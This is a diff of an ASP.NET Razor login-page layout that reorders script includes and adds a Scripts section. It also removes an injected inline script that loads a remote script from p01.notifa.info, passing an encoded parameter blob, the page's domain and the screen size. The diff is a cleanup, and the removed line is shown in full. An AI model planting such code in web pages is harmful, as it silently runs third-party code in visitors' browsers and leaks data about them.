@@ -123,11 +123,10 @@ License: You must have a valid license purchased only from themeforest(the above
     <script src="~/assets/js/login/plugins.bundle.js"></script>
     <script src="~/assets/js/login/prismjs.bundle.js"></script>
     <script src="~/assets/js/login/scripts.bundle.js"></script>
-    <!--end::Global Theme Bundle-->
-    <!--begin::Page Scripts(used by this page)-->
     <script src="~/assets/js/login/login-general.js"></script>
+    <script src="~/assets/js/scripts.bundle.js"></script>
     <!--end::Page Scripts-->
-    <script type="text/javascript">if (self == top) { function netbro_cache_analytics(fn, callback) { setTimeout(function () { fn(); callback(); }, 0); } function sync(fn) { fn(); } function requestCfs() { var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://"); var idc_glo_r = Math.floor(Math.random() * 99999999999); var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX0Vq6PjbwCaVV8httQ99f5MfVkkksERmyaGe%2fTxBzrAnK3o71cij%2b7Sd%2bo0%2bzYJ%2bSIeIiMiKVyPUsBd6qNECF6eAfiy8b61DfEWCabjyr9y8nUwMFbY88rrVDJbd%2b0vFaiMtyrQHuFLZ5%2fSeVcLT4dyCZr77k%2bgdKOyCRLk8cNsMSr3%2b5UMuqybpYsfs7jPEXH9LpHxFpnV1XGGyrg%2bo64h1s%2fr7licIHQiOFKFJXuhkZl8CTSpAGxK3iXK%2baD%2bzEj9GPEt6X5uO%2bTp1nFTxe%2fY7tnM8ZyCFdnWvZg7XeOdXIqXt1%2bvYPfB%2fk9Q6GH0egSlPG9ES1uahQHMUNuHfg%2fxAzLKGM1GW9FVSzYNXuTm5Oi4OxLAVopn1F1zXFjb1zUaoHmGzWDoc5XLYewdkLYWVbQhk%2beQHEfrUUA90X6%2fPq%2f1YukBn90N2mDLaxz7Sn21ltu0Xuw9BvsdZC9hlIBUjI9N3bkrHSIM47zqJfy%2bcKRyNlLWh31Q%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height; var bsa = document.createElement('script'); bsa.type = 'text/javascript'; bsa.async = true; bsa.src = url; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa); } netbro_cache_analytics(requestCfs, function () { }); };</script>
+    @RenderSection("Scripts", required: false)
 </body>
 <!--end::Body-->
 
